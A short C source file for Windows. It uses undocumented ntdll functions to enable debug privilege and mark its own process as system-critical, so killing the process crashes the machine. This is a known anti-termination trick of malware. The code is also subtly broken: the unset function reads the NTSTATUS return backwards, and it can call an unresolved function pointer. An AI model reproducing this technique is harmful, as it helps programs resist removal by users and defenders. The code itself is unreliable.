#include <windows.h>

typedef LONG (*pRtlSetProcessIsCritical)(BOOL,PBOOL,BOOL);
pRtlSetProcessIsCritical SetCritical;
typedef LONG (*pRtlAdjustPrivilege)(int,BOOL,BOOL,int*);
pRtlAdjustPrivilege RtlAdjPriv = NULL;

int Import () {
	HANDLE hNTDLL = LoadLibraryA("ntdll.dll");
	if (hNTDLL != NULL){
		SetCritical = (pRtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hNTDLL, "RtlSetProcessIsCritical");
		RtlAdjPriv = (pRtlAdjustPrivilege) GetProcAddress((HINSTANCE)hNTDLL,"RtlAdjustPrivilege");
		{
			int prtn;
			RtlAdjPriv(20,TRUE,FALSE,&prtn);
		}
		return 1;
	}
	return 0;	
}

int SetIsCritic(void){
	static imported = 0;
	if(!imported){
		if(Import()){
			imported++;
		}
	}
	SetCritical(TRUE,NULL,FALSE);
	SetProcessShutdownParameters(0,0);
	return 1;
}

int SetNotCritic(void){
       	if(SetCritical(FALSE,NULL,FALSE))
		return 1;
	else
		return 0;
}
